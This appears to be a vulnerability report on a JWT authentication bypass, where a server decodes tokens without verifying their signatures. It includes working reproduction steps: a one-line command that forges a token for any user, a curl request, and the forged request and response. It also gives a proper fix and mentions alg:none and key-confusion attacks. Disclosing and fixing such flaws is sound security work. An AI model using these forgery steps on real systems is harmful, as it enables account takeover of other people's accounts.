# JWT signature never verified — forge any user

## Summary

The auth layer reads the JWT with `jwt.decode()`, which only base64-decodes the token and never checks the signature. So I can mint my own token with any `sub` I like — no secret required — and the server treats me as that user. It's authentication in name only.

## Vulnerability details

- **Type / CWE:** Improper verification of cryptographic signature (CWE-347).
- **Severity:** Critical. `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = 9.8. Full authentication bypass: act as any account, including admin.
- **Affected endpoint:** any route behind the auth check; demonstrated on `GET /invoices/mine`. The flaw is in `src/security/auth.ts`.
- **Authentication:** none. The point is that I don't need a valid credential.

## Description

The token handling is:

```ts
const payload = jwt.decode(token) as jwt.JwtPayload | null;  // no signature check
if (!payload || typeof payload.sub !== 'number') return null;
return { sub: payload.sub };
```

`jwt.decode` is a parser, not a verifier. It splits the token and base64-decodes the claims; it never touches the signature or the secret. So the server trusts whatever `sub` is in the token. I sign a token with a secret I made up (or use `alg: none`), set `sub` to whoever I want, and the check passes. A related trap: even switching to `jwt.verify(token, secret)` without pinning `algorithms` leaves the `alg: none` downgrade and the RS256/HS256 key-confusion attacks open, so the fix has to pin the algorithm too.

## Steps to reproduce

1. Forge a token for bob (`sub` 2), signing with any secret — the server never checks it:
   ```bash
   node -e "console.log(require('jsonwebtoken').sign({sub:2},'attacker-secret'))"
   ```
2. Call an authenticated endpoint with the forged token:
   ```bash
   curl 'http://localhost:3000/invoices/mine' -H "Authorization: Bearer <token-from-step-1>"
   ```
3. The response is bob's data. Set `sub` to any id (or an admin's) to become that user.

## Proof of concept

Forged token payload: `{ "sub": 2 }`, signed with `attacker-secret` (not the server's key).

Request:
```
GET /invoices/mine HTTP/1.1
Host: localhost:3000
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjJ9.<sig-over-wrong-secret>
```

Response:
```json
[ { "id": 3, "description": "Pentest engagement", "amount": 3200 } ]
```

Invoice 3 is bob's. The server accepted a token it never signed, which is the bug — the signature is decorative.

## Impact

Complete authentication bypass. Anyone can become any user by choosing a `sub`, with no credential and no interaction. Every endpoint behind this check is exposed as that user: read and act on their data, and if any account carries elevated claims (`role: admin`, an admin `sub`), take that over too. This is account takeover at will across the whole application, which is why it's at the top of the scale.

## Remediation

Verify the signature and pin the algorithm:

```ts
const payload = jwt.verify(token, JWT_SECRET, { algorithms: ['HS256'] }) as jwt.JwtPayload;
if (typeof payload.sub !== 'number') return null;
return { sub: payload.sub };
```

Never use `jwt.decode` for anything trust-related. Pinning `algorithms` is required, not optional — it closes `alg: none` and key confusion. Beyond that: keep the secret strong and out of source, enforce `exp`, and confirm `sub` maps to a live account.

## References

- [CWE-347: Improper Verification of Cryptographic Signature](https://cwe.mitre.org/data/definitions/347.html)
- [OWASP JSON Web Token Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- OWASP Top 10: A07:2021 Identification and Authentication Failures
